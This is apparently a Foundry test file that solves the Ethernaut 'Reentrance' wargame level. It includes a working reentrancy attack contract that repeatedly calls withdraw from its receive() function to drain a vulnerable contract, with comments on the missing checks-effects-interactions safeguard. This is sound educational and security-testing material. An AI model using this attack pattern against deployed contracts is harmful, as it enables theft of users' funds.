// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {DummyFactory} from "src/levels/DummyFactory.sol";
import {ReentranceAttack, Reentrance} from "src/attacks/ReentranceAttack.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestReentranceSolution is Test, Utils {
    Ethernaut ethernaut;
    Reentrance instance;
    ReentrancyAttack reentrancyAttack;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DummyFactory factory = DummyFactory(getOldFactory("ReentranceFactory"));
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Reentrance(
            payable(
                createLevelInstance(
                    ethernaut,
                    Level(address(factory)),
                    0.001 ether
                )
            )
        );
        reentrancyAttack = new ReentrancyAttack(payable(address(instance)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        // goal: reenter the contract

        // these contract functions lacks of nonReentrant modifier and also lack of CEI pattern
        // CHECK -> EFFECT -> INTERACTIONS
        // which avoids on doing external calls before updating state
        // the correct way is doing external calls after updating state, so we don't have desync and outdated state

        // save initial balance to assert later
        uint256 initialBalance = address(instance).balance;

        vm.startPrank(player);

        // call reentrancyAttack contract and perform the attack
        // the call revert when run out of funds
        reentrancyAttack.attack{value: initialBalance}();

        // our attack contract should have their initial deposit + reentrance initial balance (0.001 ether + 0.001 ether)
        // we assert that the attack contract has double now
        assertTrue(address(reentrancyAttack).balance == initialBalance * 2);
    }
}

interface Reentrant {
    function attack(address) external payable;
}

contract ReentrancyAttack {
    Reentrance reentrance;
    // pass reentrance instance to perform the attack
    constructor(address payable _reentrant) {
        reentrance = Reentrance(_reentrant);
    }

    // perform the attack by sending msg.value to donate and withdraw repeatedly
    function attack() external payable {
        // attacker donates
        reentrance.donate{value: msg.value}(address(this));

        // attacker donates what he donates, and trigger receive() from .call
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        // here we should reenter the contract, for simplicity we will deposit and
        // withdraw the same amount as the initial eth balance of the contract
        uint256 counter;

        if (counter == 0) {
            reentrance.withdraw(msg.value);
        } else {
            return;
        }

        counter++;
    }
}
